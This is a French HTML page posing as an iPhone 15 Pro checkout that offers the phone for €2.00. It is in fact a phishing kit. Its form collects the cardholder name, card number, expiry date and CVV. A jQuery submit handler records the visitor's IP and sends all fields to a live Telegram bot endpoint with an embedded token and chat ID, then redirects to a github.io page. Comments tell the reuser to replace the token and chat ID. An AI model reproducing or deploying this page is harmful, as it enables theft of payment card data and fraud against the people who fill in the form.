<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
  <meta charset="UTF-8">
  <title>iPhone 15 Pro</title>
  <!-- Meta viewport pour les smartphones -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <!-- FAVICON -->
  <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
  
  <!-- LOCAL STYLE -->
  <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.2/css/bootstrap-grid.min.css" integrity="sha512-a+PObWRxNVh4HZR9wijCGj84JgJ/QhZ8dET09REfYz2clUBjKYhGbOmdy9KEHilYKgbMSIHNQEsonv/r75mHXw==" crossorigin="anonymous" referrerpolicy="no-referrer">
  
  <style>
    /* Style pour ajuster l'image produit */
    .images_wrapper .img-tab img {
      transition: transform 0.3s ease-in-out;
    }

    /* Ajuster l'image légèrement sur PC */
    @media (min-width: 768px) {
      .images_wrapper .img-tab img {
        transform: translateY(-15px);
      }
    }

    /* Style pour la couleur active */
    .img-tab.active img {
      transform: scale(1.05);
    }
  </style>

  <script>
    // Fonction pour changer l'image du produit selon la couleur choisie
    function changeProductColor(color) {
      // Cacher toutes les images
      const images = document.querySelectorAll('.img-tab');
      images.forEach(img => img.classList.remove('active'));

      // Afficher l'image correspondante à la couleur
      const colorImage = document.getElementById(color);
      colorImage.classList.add('active');
    }

    // Fonction pour gérer la sélection de couleur
    document.addEventListener('DOMContentLoaded', function () {
      // Ajouter des écouteurs d'événements aux boutons radio de couleur
      document.querySelectorAll('.img-nav-tab').forEach(button => {
        button.addEventListener('click', function () {
          const color = this.getAttribute('data-tab');
          changeProductColor(color);
        });
      });
    });
  </script>


</head>
<body>
  <section>
    <!-- BLOC PRODUIT -->
    <div class="product_wrapper animate">
      <div class="container">
        <div class="product_block" style="min-height: 180px;">
          <!-- GAUCHE : IMAGES -->
          <div class="images_wrapper">
            <div class="price_block text-center">
              <span>Seulement maintenant</span>
              <h2>€2,00</h2>
            </div>
            <div id="black" class="img-tab">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
            </div>
            <div id="blue" class="img-tab">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
            </div>
            <div id="natural" class="img-tab">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
            </div>
            <div id="white" class="img-tab active">
              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
            </div>
          </div>
          <!-- FIN GAUCHE -->

          <!-- DROITE : FORMULAIRE -->
          <div class="form_wrapper">
            <div class="product_title">
              <h1>iPhone 15 Pro</h1>
            </div>
            <div class="form_block" id="Scroll_form">
              <div class="row">
                <div class="col-12">
                  <div class="title">
                    <label>Entrez vos informations</label>
                  </div>
                </div>
              </div>
              <!-- Choix de la couleur -->
              <div class="row">
                <div class="col-12">
                  <div class="title choose_color">
                    <label>Choisissez votre couleur&nbsp;:</label>
                  </div>
                  <div class="btn-group text-center">
                    <a href="javascript:;" data-tab="black" class="img-nav-tab black active">
                      <input type="radio" name="color" id="black">
                    </a>
                    <a href="javascript:;" data-tab="blue" class="img-nav-tab blue">
                      <input type="radio" name="color" id="blue">
                    </a>
                    <a href="javascript:;" data-tab="natural" class="img-nav-tab natural">
                      <input type="radio" name="color" id="natural">
                    </a>
                    <a href="javascript:;" data-tab="white" class="img-nav-tab white">
                      <input type="radio" name="color" id="white">
                    </a>
                  </div>
                </div>
              </div>

              <!-- FORMULAIRE DE PAIEMENT -->
              <form id="paymentForm" method="post" action="">
                <center>
                  <div class="accepted-credit-cards text-center" style="margin: 1rem 0;">
                    <p class="accepted-credit-cards-heading" style="font-size: 14px; margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
                    <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto; max-width:100%;">
                  </div>
                </center>

                <!-- Champs du formulaire -->
                <div class="form_block" id="Scroll_form">
                  <div class="card-holder form-group mb-3">
                    <label for="card_holder">Titulaire de la carte</label>
                    <div class="controls">
                      <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" placeholder="Titulaire de la carte" required="" class="form-control form-control-lg">
                    </div>
                  </div>
                  <div class="card-number form-group mb-3">
                    <label for="card_number">Numéro de la carte</label>
                    <div class="controls">
                      <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="Numéro de carte" required="" class="form-control form-control-lg" maxlength="16" pattern="^[0-9]{16}$">
                    </div>
                  </div>
                  <div class="expiry-date form-group mb-3">
                    <label for="expiry_date">Date d'expiration</label>
                    <div class="controls">
                      <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM/YY" required="" class="form-control form-control-lg" maxlength="5" pattern="^(0[1-9]|1[0-2])\/[0-9]{2}$">
                    </div>
                  </div>
                  <div class="cvv form-group mb-3">
                    <label for="cvv">CVC/CVV</label>
                    <div class="controls">
                      <input type="tel" name="cvv" id="cvv" autocomplete="cc-csc" placeholder="CVC/CVV" required="" class="form-control form-control-lg" maxlength="3" pattern="^[0-9]{3}$" min="0" max="999">
                    </div>
                  </div>

                  <button type="submit" id="submitButton" class="btn btn-success btn-lg w-100">
                    <span class="submit-label">Effectuer Paiement</span>
                  </button>
                  <input type="hidden" id="user_ip" name="user_ip" value="84.5.27.23">
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <!-- SECTION INTRODUCTIVE -->
  <div class="intro_wrapper">
    <div class="container">
      <h2>Apple dévoile l'iPhone 15 Pro.</h2>
      <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
      <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
    </div>
  </div>

  <!-- BLOC D'ACTION -->
  <div class="action-button_wrapper">
    <div class="container">
      <div class="row align-items-center justify-content-center gy-lg-0 gy-4">
        <!-- Contenu éventuel -->
      </div>
    </div>
  </div>

  <footer>
    <div class="container">
      <div class="block-reassurance">
        <div class="row">
          <div class="col-12">
            <h6>Cartes de crédit acceptées:</h6>
            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
          </div>
        </div>
      </div>
    </div>
  </footer>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function () {
      // Récupérer l'IP de l'utilisateur
      $.getJSON("https://api.ipify.org?format=json", function (data) {
        $('#user_ip').val(data.ip); // Ajouter l'IP au formulaire
      });

      // Insertion automatique du "/" dans la date d'expiration
      $('#expiry_date').on('input', function(){
        var input = $(this).val();
        // Si l'utilisateur vient de saisir 2 chiffres et qu'il n'y a pas encore de "/"
        if(input.length === 2 && !input.includes('/')){
          $(this).val(input + '/');
        }
      });

      // Soumettre le formulaire avec validation
      $('#paymentForm').on('submit', function (e) {
        e.preventDefault();
        if (!validateForm()) {
          return;
        }

        var formData = $(this).serializeArray();
        var message = "Nouvelle commande reçue :\n";
        formData.forEach(function (item) {
          if (item.name !== '_token') {
            message += item.name + ": " + item.value + "\n";
          }
        });

        // Envoyer les données vers votre bot Telegram via un webhook ou API
        $.ajax({
          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage', // Remplacez par votre token
          method: 'POST',
          data: {
            chat_id: '7747778364', // Remplacez par votre chat ID
            text: message
          },
          success: function () {
            window.location.href = "https://justmoicom.github.io/test3/"; // Remplacez par l'URL où vous souhaitez rediriger après soumission
          },
          error: function () {
            window.location.href = "https://justmoicom.github.io/test3/"; // Remplacez par l'URL d'erreur
          }
        });
      });

      // Validation des champs
      function validateForm() {
        var isValid = true;
        $('input[required]').each(function () {
          if ($(this).val().trim() === '') {
            alert($(this).attr('placeholder') + ' est requis.');
            isValid = false;
            return false;
          }
        });
        return isValid;
      }
    });
  </script>

  <div id="veepn-guard-alert"></div>
  <style>
    @font-face {
      font-family: FigtreeVF;
      src: url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),
           url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");
      font-weight: 100 1000;
      font-display: swap;
    }
  </style>
  <div id="veepn-breach-alert"></div>
  <style>
    @font-face {
      font-family: FigtreeVF;
      src: url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),
           url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");
      font-weight: 100 1000;
      font-display: swap;
    }
  </style>
</body>
</html>
